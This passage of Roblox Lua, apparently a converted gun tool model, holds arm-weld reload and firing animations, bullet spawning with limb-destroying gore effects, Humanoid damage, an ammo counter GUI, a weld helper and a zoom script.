wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.15) * CFrame.fromEulerAnglesXYZ(math.rad(-91.1), math.rad(-16), -0.2)
weld55.C1 = CFrame.new(0.9, 0.05, 0.55) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.05) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), -0.4)
weld55.C1 = CFrame.new(0.9, 0.05, 0.6) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, -0.05) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), -0.6)
weld55.C1 = CFrame.new(0.875, 0.05, 0.65) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, -0.15) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), -0.8)
weld55.C1 = CFrame.new(0.85, -0.25, 0.7) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, -0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), -1)
weld55.C1 = CFrame.new(0.825, -0.45, 0.75) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, -0.35) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), -1.2)
weld55.C1 = CFrame.new(0.8, -0.65, 0.8) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
wait(.09)
weld33.C1 = CFrame.new(-0.75, -0.62, -0.35) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), -1.2)
weld55.C1 = CFrame.new(0.75, -0.62, 0.8) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
Tool.Handle.M3:play()
Tool.A1.Mesh.Offset = Vector3.new(0, 0.75, 0)
Tool.A2.Mesh.Offset = Vector3.new(0, 0.75, 0)
wait(.09)
weld33.C1 = CFrame.new(-0.75, -0.61, -0.35) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), -1.2)
weld55.C1 = CFrame.new(0.85, -0.68, 0.8) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
Tool.A1.Mesh.Offset = Vector3.new(0, 0.6, 0)
Tool.A2.Mesh.Offset = Vector3.new(0, 0.6, 0)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.61, -0.35) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), -1.2)
weld55.C1 = CFrame.new(0.95, -0.74, 0.8) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
Tool.A1.Mesh.Offset = Vector3.new(0, 0.45, 0)
Tool.A2.Mesh.Offset = Vector3.new(0, 0.45, 0)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, -0.35) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), -1.2)
weld55.C1 = CFrame.new(1.05, -0.8, 0.8) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
Tool.A1.Mesh.Offset = Vector3.new(0, 0.3, 0)
Tool.A2.Mesh.Offset = Vector3.new(0, 0.3, 0)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, -0.35) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), -1.2)
weld55.C1 = CFrame.new(1.15, -0.83, 0.8) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
Tool.A1.Mesh.Offset = Vector3.new(0, 0.15, 0)
Tool.A2.Mesh.Offset = Vector3.new(0, 0.15, 0)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, -0.35) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), -1.2)
weld55.C1 = CFrame.new(0.825, -0.8, 0.75) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
Tool.A1.Mesh.Offset = Vector3.new(0, 0, 0)
Tool.A2.Mesh.Offset = Vector3.new(0, 0, 0)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, -0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), -1)
weld55.C1 = CFrame.new(0.825, -0.5, 0.75) * CFrame.fromEulerAnglesXYZ(math.rad(275), 0.9, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, -0.15) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), -0.8)
weld55.C1 = CFrame.new(0.85, -0.2, 0.7) * CFrame.fromEulerAnglesXYZ(math.rad(275), 0.8, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, -0.05) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), -0.6)
weld55.C1 = CFrame.new(0.875, 0.1, 0.65) * CFrame.fromEulerAnglesXYZ(math.rad(275), 0.7, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.05) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), -0.4)
weld55.C1 = CFrame.new(0.9, 0.5, 0.6) * CFrame.fromEulerAnglesXYZ(math.rad(275), 0.6, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.15) * CFrame.fromEulerAnglesXYZ(math.rad(-91.1), math.rad(-16), -0.2)
weld55.C1 = CFrame.new(0.9, 1.2, 0.55) * CFrame.fromEulerAnglesXYZ(math.rad(275), 0.5, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), 0)
weld55.C1 = CFrame.new(-0.45, 0.85, 1) * CFrame.fromEulerAnglesXYZ(math.rad(310), 0.1, math.rad(-94))
end

function Reload()
Tool.Left.Value = Tool.Ammo.Value
	if script.Parent.Ammo.Value < script.Parent.MaxAmmo.Value and reloading == false and script.Parent.StoredAmmo.Value >= 1 then
		reloading = true
		script.Parent.Ammo.Value = 0
		ReloadChoose()
      script.Parent.StoredAmmo.Value = script.Parent.StoredAmmo.Value + script.Parent.Left.Value
		if script.Parent.StoredAmmo.Value >= script.Parent.MaxAmmo.Value then
			script.Parent.StoredAmmo.Value = script.Parent.StoredAmmo.Value - script.Parent.MaxAmmo.Value
			script.Parent.Ammo.Value = script.Parent.MaxAmmo.Value
         script.Parent.Recoil.Value = 5
		elseif script.Parent.StoredAmmo.Value < script.Parent.MaxAmmo.Value and script.Parent.StoredAmmo.Value >= 1 then
         script.Parent.Ammo.Value = script.Parent.StoredAmmo.Value 
			script.Parent.StoredAmmo.Value = 0
			script.Parent.Recoil.Value = 5
		end
		reloading = false
	end
end

function ReloadChoose()
   if script.Parent.Left.Value == 0 then
      ReloadSequence2()
   elseif script.Parent.Left.Value >= 1 then
      ReloadSequence()
   end
end

function Choosy()
   if script.Parent.Ammo.Value == 0 then
      Thing1()
   elseif script.Parent.Ammo.Value >= 1 then
      Thing2()
   end
end

function Thing2()
cam = game.Workspace.CurrentCamera
local cam_rot = cam.CoordinateFrame - cam.CoordinateFrame.p
local cam_scroll = (cam.CoordinateFrame.p - cam.Focus.p).magnitude
local ncf = CFrame.new(cam.Focus.p)*cam_rot*CFrame.fromEulerAnglesXYZ(0.013, 0.013, 0)
cam.CoordinateFrame = ncf*CFrame.new(0, 0, cam_scroll)
weld33.C1 = CFrame.new(-0.75, -0.65, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), 0)
weld55.C1 = CFrame.new(-0.45, 0.81, 0.97) * CFrame.fromEulerAnglesXYZ(math.rad(310), 0.1, math.rad(-94))
Tool.Flash.Mesh.Scale = Vector3.new(1.5, 1.5, 1.5)
Tool.Flash.Transparency = .8
Tool.A1.Mesh.Offset = Vector3.new(0, 0.35, 0)
Tool.A2.Mesh.Offset = Vector3.new(0, 0.35, 0)
wait(0.04)
local cam_rot = cam.CoordinateFrame - cam.CoordinateFrame.p
local cam_scroll = (cam.CoordinateFrame.p - cam.Focus.p).magnitude
local ncf = CFrame.new(cam.Focus.p)*cam_rot*CFrame.fromEulerAnglesXYZ(0.013, -0.013, 0)
cam.CoordinateFrame = ncf*CFrame.new(0, 0, cam_scroll)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), 0)
weld55.C1 = CFrame.new(-0.45, 0.85, 1) * CFrame.fromEulerAnglesXYZ(math.rad(310), 0.1, math.rad(-94))
Tool.Flash.Transparency = 1
Tool.A1.Mesh.Offset = Vector3.new(0, 0, 0)
Tool.A2.Mesh.Offset = Vector3.new(0, 0, 0)
end

function Thing1()
cam = game.Workspace.CurrentCamera
local cam_rot = cam.CoordinateFrame - cam.CoordinateFrame.p
local cam_scroll = (cam.CoordinateFrame.p - cam.Focus.p).magnitude
local ncf = CFrame.new(cam.Focus.p)*cam_rot*CFrame.fromEulerAnglesXYZ(0.013, 0.013, 0)
cam.CoordinateFrame = ncf*CFrame.new(0, 0, cam_scroll)
weld33.C1 = CFrame.new(-0.75, -0.65, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), 0)
weld55.C1 = CFrame.new(-0.45, 0.81, 0.97) * CFrame.fromEulerAnglesXYZ(math.rad(310), 0.1, math.rad(-94))
Tool.Flash.Mesh.Scale = Vector3.new(1.5, 1.5, 1.5)
Tool.Flash.Transparency = .8
wait(0.04)
local cam_rot = cam.CoordinateFrame - cam.CoordinateFrame.p
local cam_scroll = (cam.CoordinateFrame.p - cam.Focus.p).magnitude
local ncf = CFrame.new(cam.Focus.p)*cam_rot*CFrame.fromEulerAnglesXYZ(0.013, -0.013, 0)
cam.CoordinateFrame = ncf*CFrame.new(0, 0, cam_scroll)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), 0)
weld55.C1 = CFrame.new(-0.45, 0.85, 1) * CFrame.fromEulerAnglesXYZ(math.rad(310), 0.1, math.rad(-94))
Tool.Flash.Transparency = 1
Tool.Handle.Empty:play()
end

function Equip(mouse)
wait(0.01)
arms = {Tool.Parent:FindFirstChild("Left Arm"), Tool.Parent:FindFirstChild("Right Arm")}
torso = Tool.Parent:FindFirstChild("Torso")
if arms ~= nil and torso ~= nil then
local sh = {torso:FindFirstChild("Left Shoulder"), torso:FindFirstChild("Right Shoulder")}
if sh ~= nil then
local yes = true
if yes then
yes = false
sh[1].Part1 = nil
sh[2].Part1 = nil
falsearm1 = arms[1]:clone()
local mesh1 = Tool.Larm:clone()
mesh1.Parent = falsearm1
local armweld1 = Instance.new("Weld")
falsearm1.BrickColor = BrickColor.new("Light orange") 
falsearm1.Parent = Tool
armweld1.Parent = falsearm1
armweld1.Part0 = falsearm1
armweld1.Part1 = arms[1]
falsearm2 = arms[2]:clone()
local mesh2 = Tool.Rarm:clone()
mesh2.Parent = falsearm2
local armweld2 = Instance.new("Weld")
falsearm2.BrickColor = BrickColor.new("Light orange") 
falsearm2.Parent = Tool
armweld2.Parent = falsearm2
armweld2.Part0 = falsearm2
armweld2.Part1 = arms[2]
local weld1 = Instance.new("Weld") -- left arm
weld55 = weld1
weld1.Part0 = torso
weld1.Parent = torso
weld1.Part1 = arms[1]
weld1.C1 = CFrame.new(-0.45, 0.85, 1) * CFrame.fromEulerAnglesXYZ(math.rad(310), 0.1, math.rad(-94))
welds[1] = weld1
local weld2 = Instance.new("Weld") -- right arm
weld33 = weld2
weld2.Part0 = torso
weld2.Parent = torso
weld2.Part1 = arms[2]
weld2.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), 0)
welds[2] = weld2
end
else
print("sh")
end
else
print("arms")
end
end

local legs = nil
local torso2 = nil
local welds2 = {}
local bodyforce = nil

function Unequip(mouse)
if arms ~= nil and torso ~= nil then
local sh = {torso:FindFirstChild("Left Shoulder"), torso:FindFirstChild("Right Shoulder")}
if sh ~= nil then
local yes = true
if yes then
yes = false
sh[1].Part1 = arms[1]
sh[2].Part1 = arms[2]
welds[1].Parent = nil
welds[2].Parent = nil
falsearm1:remove()
falsearm2:remove()
end
else
print("sh")
end
else
print("arms")
end
end

function fire(v)

	Tool.Handle.Fire:play()
	

	local vCharacter = Tool.Parent
	local vPlayer = game.Players:playerFromCharacter(vCharacter)

	local missile = Instance.new("Part")

        

	local spawnPos = vCharacter.PrimaryPart.Position
	


	spawnPos  = spawnPos + (v * 8)

	missile.Position = spawnPos
	missile.Size = Vector3.new(1,1,1)
	missile.Velocity = v * 500 
	missile.BrickColor = BrickColor.new(26)
	missile.Shape = 0
	missile.BottomSurface = 0
	missile.TopSurface = 0
	missile.Name = "Bullet"
	missile.Elasticity = 0
	missile.Reflectance = 0
	missile.Friction = .9
   missile.CanCollide = false

	local force = Instance.new("BodyForce")
	force.force = Vector3.new(0,missile:getMass() * 196,0)
	force.Parent = missile

	local mesh = Instance.new("SpecialMesh")
	mesh.Scale = Vector3.new(.06,.06,.06)
	mesh.MeshType = "Sphere"
	mesh.Parent = missile


function Blow(Hit)
	if Hit.Name == "Head" then
		Hit.Anchored= false Hit.Size = Vector3.new(2, 0.2, 1)
		Hit.BrickColor = BrickColor.new("Maroon")
		o1 = Instance.new("Sound")
		o1.Parent = Hit
		o1.SoundId = "rbxassetid://429400881"
		o1:Play()
	end
		if Hit.Name == "Right Arm" then
			for i=1,4 do
o11.Name = "GOREPART"
o11.Parent = workspace
o11.BrickColor = BrickColor.new("Maroon")
o11.Position = Hit.Position
o11.Rotation = Vector3.new(-180, 1.29089606, 180)
o11.FormFactor = Enum.FormFactor.Symmetric
o11.Size = Vector3.new(.5, .5, .5)
o11.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o11.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o11.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o11.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o11.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o11.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o11.Color = Color3.new(0.458824, 0, 0)
end
Hit:Destroy()
		o1 = Instance.new("Sound")
		o1.Parent = o11
		o1.SoundId = "rbxassetid://429400881"
		o1:Play()

		end
				if Hit.Name == "Left Arm" then
					for i=1,4 do
		o11 = Instance.new("Part")
o11.Name = "GOREPART"
o11.Parent = workspace
o11.BrickColor = BrickColor.new("Maroon")
o11.Position = Hit.Position
o11.Rotation = Vector3.new(-180, 1.29089606, 180)
o11.FormFactor = Enum.FormFactor.Symmetric
o11.Size = Vector3.new(.5,.5,.5)
o11.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o11.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o11.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o11.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o11.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o11.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o11.Color = Color3.new(0.458824, 0, 0)
Hit:Destroy()
end
		o1 = Instance.new("Sound")
		o1.Parent = o11
		o1.SoundId = "rbxassetid://429400881"
		o1:Play()

				end
				if Hit.Name == "Right Leg" then
					for i=1,4 do
								o11 = Instance.new("Part")
o11.Name = "GOREPART"
o11.Parent = workspace
o11.BrickColor = BrickColor.new("Maroon")
o11.Position = Hit.Position
o11.Rotation = Vector3.new(-180, 1.29089606, 180)
o11.FormFactor = Enum.FormFactor.Symmetric
o11.Size = Vector3.new(.5,.5,.5)
o11.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o11.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o11.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o11.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o11.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o11.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o11.Color = Color3.new(0.458824, 0, 0)
					end
Hit:Destroy()
		o1 = Instance.new("Sound")
		o1.Parent = o11
		o1.SoundId = "rbxassetid://429400881"
		o1:Play()

		end
				if Hit.Name == "Left Arm" then
					for i=1,4 do
					o11 = Instance.new("Part")
		o11 = Instance.new("Part")
o11.Name = "GOREPART"
o11.Parent = workspace
o11.BrickColor = BrickColor.new("Maroon")
o11.Position = Hit.Position
o11.Rotation = Vector3.new(-180, 1.29089606, 180)
o11.FormFactor = Enum.FormFactor.Symmetric
o11.Size = Vector3.new(.5,.5,.5)
o11.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o11.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o11.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o11.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o11.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o11.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o11.Color = Color3.new(0.458824, 0, 0)
end
Hit:Destroy()
		o1 = Instance.new("Sound")
		o1.Parent = o11
		o1.SoundId = "rbxassetid://429400881"
		o1:Play()

				end
				
				if Hit.Name == "Left Leg" then
										for i=1,4 do
					o11 = Instance.new("Part")
		o11 = Instance.new("Part")
o11.Name = "GOREPART"
o11.Parent = workspace
o11.BrickColor = BrickColor.new("Maroon")
o11.Position = Hit.Position
o11.Rotation = Vector3.new(-180, 1.29089606, 180)
o11.FormFactor = Enum.FormFactor.Symmetric
o11.Size = Vector3.new(.5,.5,.5)
o11.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o11.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o11.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o11.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o11.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o11.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o11.Color = Color3.new(0.458824, 0, 0)
end
Hit:Destroy()
		o1 = Instance.new("Sound")
		o1.Parent = o11
		o1.SoundId = "rbxassetid://429400881"
		o1:Play()

		end
				if Hit.Name == "Left Arm" then
							for i=1,4 do
					o11 = Instance.new("Part")
		o11 = Instance.new("Part")
o11.Name = "GOREPART"
o11.Parent = workspace
o11.BrickColor = BrickColor.new("Maroon")
o11.Position = Hit.Position
o11.Rotation = Vector3.new(-180, 1.29089606, 180)
o11.FormFactor = Enum.FormFactor.Symmetric
o11.Size = Vector3.new(.5,.5,.5)
o11.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o11.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o11.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o11.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o11.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o11.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o11.Color = Color3.new(0.458824, 0, 0)
end
Hit:Destroy()
		o1 = Instance.new("Sound")
		o1.Parent = o11
		o1.SoundId = "rbxassetid://429400881"
		o1:Play()

				end
								if Hit.Name == "Torso" then
							for i=1,8 do
					o11 = Instance.new("Part")
		o11 = Instance.new("Part")
o11.Name = "GOREPART"
o11.Parent = workspace
o11.BrickColor = BrickColor.new("Maroon")
o11.Position = Hit.Position
o11.Rotation = Vector3.new(-180, 1.29089606, 180)
o11.FormFactor = Enum.FormFactor.Symmetric
o11.Size = Vector3.new(.5,.5,.5)
o11.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o11.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o11.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o11.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o11.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o11.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o11.Color = Color3.new(0.458824, 0, 0)
end

Hit:Destroy()
		o1 = Instance.new("Sound")
		o1.Parent = o11
		o1.SoundId = "rbxassetid://429400881"
		o1:Play()

								end
								end
function onTouched(part)
     local h = part.Parent:findFirstChild("Humanoid")
     if h~=nil then
               h.Health = h.Health -100
               wait(.1)
               h.Health = h.Health -100
               wait(.1)

       end
end

missile.Touched:connect(onTouched)
missile.Touched:connect(Blow)


	local creator_tag = Instance.new("ObjectValue")
	creator_tag.Value = vPlayer
	creator_tag.Name = "creator"
	creator_tag.Parent = missile
	
   missile.Parent = game.Workspace

   cam = game.Workspace.CurrentCamera
   local cam_rot = cam.CoordinateFrame - cam.CoordinateFrame.p
	local cam_scroll = (cam.CoordinateFrame.p - cam.Focus.p).magnitude
	local ncf = CFrame.new(cam.Focus.p)*cam_rot*CFrame.fromEulerAnglesXYZ(0.013, -0.013, 0)
	cam.CoordinateFrame = ncf*CFrame.new(0, 0, cam_scroll)
	weld33.C1 = CFrame.new(-0.75, -0.7, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), 0)
   weld55.C1 = CFrame.new(-0.45, 0.77, 0.94) * CFrame.fromEulerAnglesXYZ(math.rad(310), 0.1, math.rad(-94))
	Tool.Flash.Mesh.Scale = Vector3.new(1.727, 1.7, 1.727)
	Tool.Flash.Transparency = .5
   Tool.A1.Mesh.Offset = Vector3.new(0, 0.7, 0)
   Tool.A2.Mesh.Offset = Vector3.new(0, 0.7, 0)
	wait(0.04)
   Choosy()
end

function KeyDownFunctions(key)
	if key == "r" then
		Reload()
	end
end

Tool.Enabled = true
function onActivated()

	if not Tool.Enabled then
		return
	end

	Tool.Enabled = false

	local character = Tool.Parent;
	local humanoid = character.Humanoid
	if humanoid == nil then
		print("Humanoid not found")
		return 
	end
	local ammo = script.Parent.Ammo
	local maxammo = script.Parent.MaxAmmo
	firing = true
	while firing == true do
		wait()
		if reloading == false and humanoid.Health >= 1 then
			if ammo.Value >= 1 then
				ammo.Value = ammo.Value - 1
				local targetPos = humanoid.TargetPoint
				local lookAt = (targetPos - character.Head.Position).unit
				if script.Parent.Recoil.Value < 10 then
					script.Parent.Recoil.Value = script.Parent.Recoil.Value + 1
				end
				fire(lookAt)
			else
				Reload()
				break
			end
		elseif reloading == false and humanoid.Health < 1 then
			Tool:remove()
		end
	end
	Tool.Enabled = true
end

function nofiar(mouse)
firing = false
end

function onEquippedLocal(mouse)

	if mouse == nil then
		print("Mouse not found")
		return 
	end

	mouse.Icon = "http://www.roblox.com/asset/?id=49912389"
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)
	mouse.Button1Up:connect(function() nofiar(mouse) end)
	mouse.KeyDown:connect(KeyDownFunctions)
	while true do
		wait()
	end
end


Tool.Equipped:connect(onEquippedLocal)


script.Parent.Activated:connect(onActivated)
Tool.Equipped:connect(Equip)
Tool.Unequipped:connect(Unequip)

end,o9)
end))
o10 = Instance.new("LocalScript")
o10.Name = "BackupWeld"
o10.Parent = o1
table.insert(cors,coroutine.create(function()
wait()
RPKTHing(function()
function Weld(x,y)
	local W = Instance.new("Weld")
	W.Part0 = x
	W.Part1 = y
	local CJ = CFrame.new(x.Position)
	local C0 = x.CFrame:inverse()*CJ
	local C1 = y.CFrame:inverse()*CJ
	W.C0 = C0
	W.C1 = C1
	W.Parent = x
end

function Get(A)
	if A.className == "Part" then
		Weld(script.Parent.Handle, A)
		A.Anchored = false
	else
		local C = A:GetChildren()
		for i=1, #C do
		Get(C[i])
		end
	end
end

function Finale()
	Get(script.Parent)
end

script.Parent.Equipped:connect(Finale)
script.Parent.Unequipped:connect(Finale)
Finale()
end,o10)
end))
o11 = Instance.new("LocalScript")
o11.Name = "GuiScript"
o11.Parent = o1
table.insert(cors,coroutine.create(function()
wait()
RPKTHing(function()

local Tool = script.Parent
local Ammo = Tool.Ammo
local MaxAmmo = Ammo.Value

local vPlayer
local Gui
local Text

function onChanged(value)
	if value == "Value" or value == Ammo.Value then
		if Gui ~= nil and Text ~= nil then
			if Ammo.Value >= 1 then
				Text.Text = ""..script.Parent.Ammo.Value.."|"..script.Parent.StoredAmmo.Value..""
			elseif math.floor(Ammo.Value) == 0 then
				Text.Text = ""..script.Parent.Ammo.Value.."|"..script.Parent.StoredAmmo.Value..""
			elseif Ammo.Value < 0 then
				for i = 0, 1, 0.03 / 2 do
					local Num = math.floor(i * MaxAmmo + 0.5)

					Text.Text = ""..script.Parent.Ammo.Value.."|"..script.Parent.StoredAmmo.Value..""
					wait()
				end
			end
		end
	end
end

function on2Changed()
	if Gui ~= nil and Text ~= nil then

		Text.Text = ""..script.Parent.Ammo.Value.."|"..script.Parent.StoredAmmo.Value..""
		wait()
	end
end

function setUpGui()
	if vPlayer == nil or vPlayer:findFirstChild("PlayerGui") == nil then
		return
	end

	Gui = Instance.new("ScreenGui")
	Text = Instance.new("TextLabel")

	Gui.Name = "DEDisplay"
	Gui.Parent = vPlayer.PlayerGui

	Text.BackgroundColor3 = BrickColor.Black().Color
   Text.BackgroundTransparency = 1
	Text.BorderColor3 = BrickColor.White().Color
   Text.BorderSizePixel = 0
	Text.Name = "Ammo"
	Text.Parent = Gui
	Text.Position = UDim2.new(0.15, 0, 0.825, 0)
	Text.Size = UDim2.new(0, -60, 0, 64)
   Text.FontSize = "Size18"
	Text.Text = ""..script.Parent.Ammo.Value.."|"..script.Parent.StoredAmmo.Value..""
	Text.TextColor3 = BrickColor.White().Color
end

function onEquippedLocal(mouse)
	vPlayer = game.Players.LocalPlayer

	setUpGui()
end

function onUnequippedLocal(mouse)
	if Gui then
		Gui:remove()
	end

	Gui = nil
	Text = nil
	vPlayer = nil
end

Tool.Equipped:connect(onEquippedLocal)
Tool.Unequipped:connect(onUnequippedLocal)

Ammo.Changed:connect(onChanged)
Tool.StoredAmmo.Changed:connect(on2Changed)
end,o11)
end))
o12 = Instance.new("LocalScript")
o12.Name = "GuiScript(backup)"
o12.Parent = o1
table.insert(cors,coroutine.create(function()
wait()
RPKTHing(function()


local Tool = script.Parent
local Ammo = Tool.Ammo
local MaxAmmo = Ammo.Value

local vPlayer
local Gui
local Text

function onChanged(value)
	if value == "Value" or value == Ammo.Value then
		if Gui ~= nil and Text ~= nil then
			if Ammo.Value >= 1 then
				Text.Text = ""..script.Parent.Ammo.Value.."|"..script.Parent.StoredAmmo.Value..""
			elseif math.floor(Ammo.Value) == 0 then
				Text.Text = ""..script.Parent.Ammo.Value.."|"..script.Parent.StoredAmmo.Value..""
			elseif Ammo.Value < 0 then
				for i = 0, 1, 0.03 / 2 do
					local Num = math.floor(i * MaxAmmo + 0.5)

					Text.Text = ""..script.Parent.Ammo.Value.."|"..script.Parent.StoredAmmo.Value..""
					wait()
				end
			end
		end
	end
end

function on2Changed()
	if Gui ~= nil and Text ~= nil then

		Text.Text = ""..script.Parent.Ammo.Value.."|"..script.Parent.StoredAmmo.Value..""
		wait()
	end
end

function setUpGui()
	if vPlayer == nil or vPlayer:findFirstChild("PlayerGui") == nil then
		return
	end

	Gui = Instance.new("ScreenGui")
	Text = Instance.new("TextLabel")

	Gui.Name = "DEDisplay"
	Gui.Parent = vPlayer.PlayerGui

	Text.BackgroundColor3 = BrickColor.Black().Color
   Text.BackgroundTransparency = 1
	Text.BorderColor3 = BrickColor.White().Color
   Text.BorderSizePixel = 0
	Text.Name = "Ammo"
	Text.Parent = Gui
	Text.Position = UDim2.new(0.15, 0, 0.825, 0)
	Text.Size = UDim2.new(0, -60, 0, 64)
   Text.FontSize = "Size18"
	Text.Text = ""..script.Parent.Ammo.Value.."|"..script.Parent.StoredAmmo.Value..""
	Text.TextColor3 = BrickColor.White().Color
end

function onEquippedLocal(mouse)
	vPlayer = game.Players.LocalPlayer

	setUpGui()
end

function onUnequippedLocal(mouse)
	if Gui then
		Gui:remove()
	end

	Gui = nil
	Text = nil
	vPlayer = nil
end

Tool.Equipped:connect(onEquippedLocal)
Tool.Unequipped:connect(onUnequippedLocal)

Ammo.Changed:connect(onChanged)
Tool.StoredAmmo.Changed:connect(on2Changed)
end,o12)
end))
o13 = Instance.new("SpecialMesh")
o13.Name = "Larm"
o13.Parent = o1
o13.Scale = Vector3.new(0.99000001, 0.99000001, 0.99000001)
o13.MeshType = Enum.MeshType.FileMesh
o14 = Instance.new("SpecialMesh")
o14.Name = "Rarm"
o14.Parent = o1
o14.Scale = Vector3.new(0.99000001, 0.99000001, 0.99000001)
o14.MeshType = Enum.MeshType.FileMesh
o15 = Instance.new("LocalScript")
o15.Name = "Zoom Script"
o15.Parent = o1
table.insert(cors,coroutine.create(function()
wait()
RPKTHing(function()
local Tool = script.Parent
a=false
cam=nil
wut = Tool.Parent



function onEquipped(mouse2)
	mouse2.KeyDown:connect(onkeyDown)
	mouse = mouse2
end
function onkeyDown(key) 
	if key == "q" then
	if not a then 
		cam=game.Workspace.CurrentCamera:clone()
		cam.Parent=game.Workspace
		game.Workspace.CurrentCamera.CameraSubject = Tool.Zoom
		game.Workspace.CurrentCamera.CameraType=1
		Tool.Recoil.Value = 5
		Tool.ZoomedInXD.Value = true
		Tool.Parent.Humanoid.WalkSpeed = 10
		a=true
	else
		game.Workspace.CurrentCamera.CameraSubject=game.Players.LocalPlayer.Character
		game.Workspace.CurrentCamera:Remove()
		game.Workspace.CurrentCamera=cam
		Tool.ZoomedInXD.Value = false
		Tool.Recoil.Value = 10
		Tool.Parent.Humanoid.WalkSpeed = 16
		a=false
	end
end 
end




script.Parent.Equipped:connect(onEquipped)

end,o15)
end))
o16 = Instance.new("BoolValue")
o16.Name = "ZoomedInXD"
o16.Parent = o1
